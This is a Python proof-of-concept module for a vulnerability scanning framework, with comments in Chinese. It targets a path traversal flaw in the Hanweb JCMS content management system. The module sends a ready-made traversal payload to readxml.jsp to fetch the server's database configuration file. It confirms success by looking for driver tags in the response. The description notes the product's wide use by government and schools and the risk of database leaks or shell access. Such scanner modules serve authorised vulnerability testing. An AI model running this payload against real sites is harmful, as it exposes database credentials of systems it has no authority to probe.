# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Hanweb_0001'  # 平台漏洞编号，留空
    name = '大汉版通JCMS数据库配置 文件读取'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_TRAVERSAL  # 漏洞类型
    disclosure_date = '2013-12-24'  # 漏洞公布时间
    desc = '''
        大汉科技（Hanweb）大汉JCMS内容管理系统由于对文件读取时没有对文件路径进行过滤，
        导致可以直接直接读取数据库配置文件，该产品政府部门以及学校使用较多，可导致数据库泄露或者getshell.
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/1153/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Hanweb(大汉)'  # 漏洞应用名称
    product_version = '大汉JCMS'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '7cdddbfd-fc97-41a3-80b3-a9905e5d80e5'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '''/jcms/workflow/design/readxml.jsp?flowcode=../../../WEB-INF/config/dbconfig'''
            verify_url = self.target + payload
            r = requests.get(verify_url)

            if r.status_code == 200 and '<driver-class>' in r.text and '<driver-properties>' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
